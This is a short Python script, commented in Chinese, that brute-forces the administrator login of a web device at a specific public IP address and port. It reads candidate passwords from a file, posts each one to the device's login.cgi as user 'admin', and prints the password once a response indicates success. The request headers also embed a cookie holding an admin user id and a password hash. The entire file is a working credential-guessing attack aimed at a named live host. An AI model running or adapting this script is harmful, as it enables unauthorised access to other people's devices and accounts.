# http://116.28.40.39:800/login.html
import requests

# 定义目标URL和请求头
url = "http://116.28.40.39:800/login.cgi"
headers = {
    "Host": "116.28.40.39:800",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://116.28.40.39:800",
    "Connection": "keep-alive",
    "Referer": "http://116.28.40.39:800/login.html",
    "Cookie": "ac_userid=admin,ac_passwd=F5E6EE2989FA1F8CA80CC135F70BDA98",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

# 读取密码文件
with open("password.txt", "r") as file:
    passwords = file.readlines()

# 尝试每个密码
for password in passwords:
    password = password.strip()  # 去除行尾的换行符
    data = {
        "user": "admin",
        "password": password
    }

    response = requests.post(url, headers=headers, data=data)

    # 检查响应状态码和内容
    if response.status_code == 200:
        if "index.htm" in response.text:
            print(f"登录成功，密码为: {password}")
            break
        else:
            print(f"尝试密码: {password} 失败")
    else:
        print(f"请求失败，状态码: {response.status_code}")
